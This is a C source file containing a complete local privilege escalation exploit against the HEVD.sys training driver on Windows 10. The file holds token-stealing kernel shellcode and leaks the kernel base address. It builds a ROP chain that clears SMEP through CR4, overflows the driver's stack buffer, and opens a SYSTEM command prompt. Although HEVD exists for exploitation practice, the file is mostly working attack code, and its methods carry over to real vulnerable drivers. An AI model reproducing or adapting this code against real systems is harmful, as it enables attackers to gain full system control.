#include "exploit.h"

unsigned char assembly[] = {
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xC3, 0x48, 0x8B, 0x9B, 0x48, 0x04, 0x00, 0x00, 0x48, 0x81, 0xEB, 0x48, 0x04, 0x00,
	0x00, 0x48, 0x8B, 0x8B, 0x40, 0x04, 0x00, 0x00, 0x48, 0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x8B, 0x8B, 0xB8, 0x04, 0x00, 0x00, 0x80, 0xE1, 0xF0, 0x48, 0x89, 0x88, 0xB8, 0x04, 0x00, 0x00, 0xC3
};

int main(int argc, char** argv)
{
	// Preparation Stage Stack Variables
	void* h_ntdll = LoadLibraryA("C:\\Windows\\System32\\ntdll.dll");
	void* h_driver = CreateFileA(TARGET_DEVICE_DRIVER, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	void* payload = (void*)0;
	unsigned long long nt_kernel_base_address = 0;
	unsigned char unused = 0;

	// Exploitation Stage Stack Variables
	unsigned char input[2104] = { 0 };
	unsigned char output[256] = { 0 };
	unsigned long long pop_rcx_gadget = 0ULL;
	unsigned long long cr4_value = 0x70678;
	unsigned long long mov_cr4_rcx_gadget = 0ULL;
	unsigned long bytes_returned = 0UL;

	RtlSecureZeroMemory(input, sizeof(input));
	RtlSecureZeroMemory(output, sizeof(output));

	SetConsoleTitleA("HEVD.sys Stack-based Buffer Overflow (Windows 10)");

	printf("[*] HEVD.sys Stack-based Buffer Overflow Local Privilege Escalation Vulnerability (Windows 10)\n[*] Exploit written by Niko.\n[!] Let's exploit!\n");

	if (h_driver == (void*)-1)
	{
		printf("\n[-] Failed to obtain a handle to the vulnerable device driver. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the vulnerable device driver. Handle Value: 0x%p", h_driver);

	if (!h_ntdll)
	{
		printf("\n[-] Failed to obtain a handle to the \"ntdll.dll\" module. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the \"ntdll.dll\" module. Module Handle Value: 0x%p", h_ntdll);

	nt_kernel_base_address = leak_ntoskrnl_base_address(h_ntdll);
	if (!nt_kernel_base_address)
	{
		return 1;
	}

	payload = VirtualAlloc(0, sizeof(assembly), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!payload)
	{
		printf("\n[-] Failed to allocate stack memory for the kernel payload. Error: %d (0x%x)", GetLastError(), GetLastError());
		unused = getchar();
		return 1;
	}
	printf("\n[+] Allocated stack memory for the kernel payload. Payload Address: 0x%p", payload);

	memcpy(payload, assembly, sizeof(assembly));
	printf("\n[+] Prepared the kernel payload.");

	pop_rcx_gadget = nt_kernel_base_address + POP_RCX_OFFSET;
	mov_cr4_rcx_gadget = nt_kernel_base_address + MOV_CR4_RCX_OFFSET;
	printf("\n[+] Calculated kernel instruction addresses.\n[*] pop rcx: 0x%p\n[*] mov cr4, rcx: 0x%p", (void*)pop_rcx_gadget, (void*)mov_cr4_rcx_gadget);

	memset(input, 'A', 2072);
	*(unsigned long long*)(input + 2072) = (unsigned long long*)pop_rcx_gadget;
	*(unsigned long long*)(input + 2080) = (unsigned long long*)cr4_value;
	*(unsigned long long*)(input + 2088) = (unsigned long long*)mov_cr4_rcx_gadget;
	*(unsigned long long*)(input + 2096) = (unsigned long long*)payload;
	printf("\n[+] Crafted the special input buffer.");

	for (int i = 3; i > 0; i--)
	{
		printf("\n[!] Triggering kernel memory corruption in %d...", i);
		Sleep(1000);
	}
	printf("\n\n<---------------- | Entering Danger Zone | ---------------->");

	DeviceIoControl(h_driver, TARGET_FUNCTION_IOCTL, input, sizeof(input), output, sizeof(output), &bytes_returned, 0);
	printf("\n[!] Triggered kernel stack-based buffer overflow.\n<---------------- | Leaving Danger Zone | ---------------->\n\n[+] Kernel exploitation completed successfully.");
	
	system("start C:\\Windows\\System32\\cmd.exe");
	unused = getchar();
	return 0;
}